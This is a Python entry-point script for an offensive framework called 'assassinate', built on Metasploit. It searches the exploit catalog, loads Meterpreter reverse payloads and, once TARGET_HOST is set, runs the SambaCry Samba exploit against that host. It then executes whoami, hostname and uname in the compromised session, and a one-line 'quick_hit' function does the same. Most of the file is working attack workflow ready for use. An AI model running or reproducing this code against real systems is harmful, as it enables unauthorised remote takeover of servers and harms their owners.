"""Main entry point for the assassination framework.

This module demonstrates the high-level Assassinate API with Arsenal,
Contracts, and the full workflow from weapon discovery to execution.

Usage:
    # Demo mode (shows capabilities)
    python -m assassinate

    # Exploitation mode (requires TARGET_HOST environment variable)
    TARGET_HOST=192.168.1.100 python -m assassinate

Environment Variables:
    TARGET_HOST: IP address of target to exploit (optional)
    MSF_ROOT: Path to Metasploit Framework installation
"""

from __future__ import annotations

import os
import sys

from assassinate import Hideout, Target, Contract


def demo_arsenal(hideout: Hideout) -> None:
    """Demonstrate arsenal search and discovery capabilities."""
    print("=" * 60)
    print("  ARSENAL DEMONSTRATION")
    print("=" * 60)
    print()

    # Show arsenal statistics
    print("📊 Arsenal Statistics:")
    stats = hideout.arsenal.stats()
    for mod_type, count in sorted(stats.items()):
        print(f"  • {mod_type.capitalize()}: {count}")
    print()

    # Demonstrate new catalog-based filtering
    print("🔍 Catalog-Based Filtering (New API):")

    # Filter weapons using catalog
    print("\n  [1] SMB exploits with good+ rank (catalog filter)...")
    smb_exploits = hideout.arsenal.weapons.filter(
        type="exploit",
        service="smb",
        min_rank="good"
    ).sorted_by_rank().limit(5)

    for info in smb_exploits:
        print(f"      • {info.name} ({info.rank}) - {info.description[:50]}...")

    # Chain filters
    print("\n  [2] Linux exploits (chained filters)...")
    linux = hideout.arsenal.weapons.exploits().by_platform("linux").limit(5)
    for info in linux:
        platforms = ", ".join(info.platforms) if info.platforms else "any"
        print(f"      • {info.name} - {platforms}")

    # Filter bullets
    print("\n  [3] Meterpreter reverse bullets for Linux...")
    bullets = hideout.arsenal.bullets.meterpreter().reverse().for_platform("linux").limit(5)
    for b in bullets:
        print(f"      • {b.name}")
        print(f"        Type: {b.type}, Arch: {b.arch}")

    # Legacy search still works
    print("\n  [4] Legacy search: 'samba' exploits...")
    weapons = hideout.arsenal.find("samba", type="exploit", limit=3)
    for w in weapons:
        print(f"      • {w.name} ({w.rank}) - {w.short_description}")

    print()


def demo_weapon_details(hideout: Hideout) -> None:
    """Demonstrate weapon inspection capabilities."""
    print("=" * 60)
    print("  WEAPON INSPECTION")
    print("=" * 60)
    print()

    # Get weapon from catalog entry
    print("🔫 Getting weapon from catalog entry:")
    samba_weapons = hideout.arsenal.weapons.search("is_known_pipename").limit(1)
    if samba_weapons:
        info = samba_weapons.first()
        print(f"   Found: {info.fullname}")
        print(f"   Rank: {info.rank}, Service: {info.service}, Port: {info.port}")

        # Get full weapon object
        weapon = info.weapon()
        print()
        print(weapon.describe())
    else:
        # Fallback to direct get
        weapon = hideout.arsenal.get("exploit/linux/samba/is_known_pipename")
        print(weapon.describe())

    # Show compatible bullets
    print("\n📦 Compatible Bullets (top 5):")
    bullets = weapon.bullets()[:5]
    for b in bullets:
        print(f"  • {b.name}")
        print(f"    Type: {b.type}, Arch: {b.arch}, Connection: {b.connection}")

    # Load best bullet
    best = weapon.best_bullet()
    if best:
        weapon.load(best)
        print(f"\n  🎯 Loaded: {weapon.loaded.name}")

    print()


def demo_contract_workflow(hideout: Hideout, target_host: str) -> None:
    """Demonstrate the full contract workflow with a real target."""
    print("=" * 60)
    print("  CONTRACT WORKFLOW")
    print("=" * 60)
    print()

    # Create target
    target = Target(target_host)
    print(f"🎯 Target: {target.host}")

    # Find weapon
    print("\n🔍 Searching for SambaCry exploit...")
    weapons = hideout.arsenal.find("is_known_pipename", type="exploit")
    if not weapons:
        print("   ❌ Weapon not found!")
        return

    weapon = weapons[0]
    print(f"   ✓ Found: {weapon.fullname}")

    # Create contract
    print("\n📝 Creating contract...")
    contract = hideout.contract(target, weapon)
    contract.configure(SMB_SHARE_NAME="myshare")
    print(f"   Weapon: {contract.weapon.name}")
    print(f"   Bullet: {contract.bullet.name}")
    print(f"   Target: {contract.target.host}")

    # Validate
    issues = contract.validate()
    if issues:
        print(f"\n   ⚠️  Validation issues:")
        for issue in issues:
            print(f"      - {issue}")

    # Profile target
    print("\n🔬 Profiling target...")
    if contract.profile(timeout=3.0):
        print(f"   ✓ Target appears vulnerable!")
        print(f"   ✓ Open ports: {sorted(target.ports)}")

        # Execute
        print("\n💀 Executing contract...")
        kill = contract.execute(timeout=60)

        if kill:
            print(f"\n   ✓ TARGET ELIMINATED!")
            print(f"   Session: {kill.id} ({kill.type})")
            print(f"   Host: {kill.host}:{kill.port}")

            # Interrogate
            print("\n🔍 Interrogating target...")
            whoami = kill.interrogate("whoami").strip()
            print(f"   whoami: {whoami}")

            hostname = kill.interrogate("hostname").strip()
            print(f"   hostname: {hostname}")

            uname = kill.interrogate("uname -a").strip()
            print(f"   uname: {uname}")

            # Clean up
            print("\n🧹 Cleaning up...")
            kill.silence()
            print("   ✓ Session terminated")
        else:
            print("\n   ❌ Exploitation failed - no session established")
    else:
        print(f"   ❌ Target not vulnerable or port closed")

    print()


def demo_quick_hit(hideout: Hideout, target_host: str) -> None:
    """Demonstrate the quick_hit one-liner method."""
    print("=" * 60)
    print("  QUICK HIT (ONE-LINER)")
    print("=" * 60)
    print()

    print(f"🎯 Target: {target_host}")
    print("   Using hideout.quick_hit() for instant exploitation...")
    print()

    kill = hideout.quick_hit(
        target=target_host,
        weapon="exploit/linux/samba/is_known_pipename",
        SMB_SHARE_NAME="myshare",
        timeout=60,
    )

    if kill:
        print(f"   ✓ SUCCESS! Kill #{kill.id}")
        print(f"   {kill.interrogate('id').strip()}")
        kill.silence()
    else:
        print("   ❌ Exploitation failed")

    print()


def main() -> None:
    """Initialize hideout and demonstrate framework capabilities."""
    # Check for target host
    target_host = os.environ.get("TARGET_HOST")

    print()
    print("    █████╗ ███████╗███████╗ █████╗ ███████╗███████╗██╗███╗   ██╗ █████╗ ████████╗███████╗")
    print("   ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝██║████╗  ██║██╔══██╗╚══██╔══╝██╔════╝")
    print("   ███████║███████╗███████╗███████║███████╗███████╗██║██╔██╗ ██║███████║   ██║   █████╗")
    print("   ██╔══██║╚════██║╚════██║██╔══██║╚════██║╚════██║██║██║╚██╗██║██╔══██║   ██║   ██╔══╝")
    print("   ██║  ██║███████║███████║██║  ██║███████║███████║██║██║ ╚████║██║  ██║   ██║   ███████╗")
    print("   ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝   ╚══════╝")
    print()
    print("                    High-Level Python Framework for Precision Exploitation")
    print()

    # Establish the hideout
    with Hideout() as hideout:
        print(f"🏠 Hideout established - Framework v{hideout.version}")
        print()

        # Always run demos
        demo_arsenal(hideout)
        demo_weapon_details(hideout)

        # If target specified, run exploitation
        if target_host:
            print()
            print("🎯 TARGET_HOST detected - proceeding with exploitation...")
            print()
            demo_contract_workflow(hideout, target_host)
        else:
            print()
            print("💡 Set TARGET_HOST environment variable to run exploitation demo:")
            print("   TARGET_HOST=192.168.1.100 python -m assassinate")
            print()

        # Show current kills
        kills = hideout.kills()
        if kills:
            print(f"💀 Active kills: {len(kills)}")
            for kill in kills:
                print(f"   • {kill}")
        else:
            print("💀 No active kills")
        print()

        print("✓ Mission briefing complete")


if __name__ == "__main__":
    main()
